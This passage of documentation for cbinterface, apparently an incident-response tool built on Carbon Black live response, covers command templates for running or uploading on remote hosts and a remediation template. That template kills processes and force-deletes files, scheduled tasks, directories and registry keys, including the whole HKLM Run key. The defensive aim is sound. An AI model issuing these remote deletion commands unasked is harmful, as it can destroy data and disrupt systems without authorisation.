;# other run options. Values are their defaults.
;wait_for_output=yes
;remote_output_file_name=
;working_directory=
;wait_timeout=30
;wait_for_completion=yes
;print_results=yes
;write_results_path=no

[command_example_upload]
operation=upload
path=File_in_working_dir_on_client_OR_full_path_to_file_on_client
# built-in placeholder HOSTNAME used in example:
write_results_path={HOSTNAME}_Example_FileName

[command_cmd_shell_example]
operation=run
wait_for_output=no
command=cmd.exe /c del my_cool_thing.bat

;# Now you can go on with however many command sections you desire and 
;# in whatever order to accommplish whatever need. Be wise.
```


## Live Response Remediation Scripts

To adequately respond to an infection, you often need to perform multiple remediation actions to achieve your goal. It's always the best case to identify everything that needs remediation and clean it up in one single pass. This type of single pass remediation helps ensure watch dog processes and other persistent mechanisms are cleaned up before a malicious infection can re-gain a persistent foothold. It’s an all out blitz attack on the malicious infection. When you attack on all fronts at, at the same time, you're more likely to be successful.

As mentioned above, in the Live Response Remediation section, you can use the following command to write a remediation template:

```
$ cbinterface lr deviceNameOrIdHere remediate --write-template 
2021-03-13 18:45:10 analysis cbinterface.cli[32418] INFO  + wrote remediate.ini
```

The contnet of remediate.ini file:

```
## Example remediate routine file.
##  All keys are commented out under their respective sections by default.
# Remediation is performed in the following order:
#  1. Kill running processes
#  2. Delete registry locations
#  3. Delete scheduled tasks
#  4. Delete services
#  5. Delete files
#  6. Delete directories

# Specify full paths to files that you want to delete.
#  ex: file1=c:\programdata\lemontrack installer\winserv.exe
[files]
;file1=
;file2=
;file3=

# Specify processes that you want to kill by name. All processes matching the name will be killed
#  ex: proc1=winserv.exe
[process_names]
;proc1=
;proc2=
;proc3=

# Delete a scheduled task
#  ex: task1=TaskFolder\DHCP Monitor Task
[scheduled_tasks]
;task1=
;task2=

# SC delete services by their name
# Not yet Implemented with CbLR
[services]
;service1=
;service2=
 
# Delete entire directories
#  ex: directory1=C:\ProgramData\LemonTrack Installer
[directories]
;directory1=
;directory2=

# Delete processes by their ID
#  ex: pid1=2664
[pids]
;pid1=
;pid2=

# delete individual registry key-values
#  ex: reg1=HKU\S-1-5-21-1660022851-2357930215-3100199371-1001\Software\Microsoft\Windows\CurrentVersion\Run\LemonTrack
#  This translates to: REG DELETE "HKU\S-1-5-21-1660022851-2357930215-3100199371-1001\Software\Microsoft\Windows\CurrentVersion\Run" /v LemonTrack /f
[registry_values]
;reg1=
;reg2=

# delete all values behing a key
#  ex: reg1=HKLM\Software\Microsoft\Windows\CurrentVersion\Run
#  REG DELETE HKLM\Software\Microsoft\Windows\CurrentVersion\Run /f
[registry_keys]
;reg1=
;reg2=
```


